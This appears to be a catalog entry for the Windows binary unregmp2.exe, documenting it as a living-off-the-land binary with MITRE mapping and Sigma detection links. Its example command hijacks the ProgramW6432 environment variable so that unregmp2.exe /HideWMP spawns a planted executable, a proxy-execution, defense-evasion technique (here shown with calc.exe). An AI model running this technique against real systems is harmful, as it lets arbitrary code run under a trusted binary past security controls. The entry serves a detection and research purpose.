---
id: windows-execution-unregmp2
namespace: windows:execution:unregmp2
name: unregmp2
description: 'Microsoft Windows Media Player Setup Utility Located at: C:\Windows\System32\unregmp2.exe;
  C:\Windows\SysWOW64\unregmp2.exe.'
author: Wade Hickey
version: 1.0.0
capabilities:
- security.execution.command
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
- unregmp2
parameters: []
features:
- pipes-stdin
- pipes-stdout
execution:
  template: unregmp2
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Allows an attacker to copy a target binary to a controlled directory
    and modify the 'ProgramW6432' environment variable to point to that controlled
    directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn
    a process at the hijacked path '%ProgramW6432%\wmpnscfg.exe'. (Proxy execution
    of binary)
  command: rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player"
    & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe"
    >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe /HideWMP"
references:
- label: '1466588365336293385'
  url: https://twitter.com/notwhickey/status/1466588365336293385
techniques:
- execution
- defense-evasion
mitre_ids:
- T1202
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/197615345b927682ab7ad7fa3c5f5bb2ed911eed/rules/windows/process_creation/proc_creation_win_lolbin_unregmp2.yml
- type: ioc
  description: Low-prevalence binaries, with filename 'wmpnscfg.exe', spawned as child-processes
    of `unregmp2.exe /HideWMP`
install:
- method: choco
  package_name: unregmp2
  commands:
  - choco install unregmp2
---

# unregmp2

unregmp2 is a Windows LOLBin. Microsoft Windows Media Player Setup Utility Located at: C:\Windows\System32\unregmp2.exe; C:\Windows\SysWOW64\unregmp2.exe.
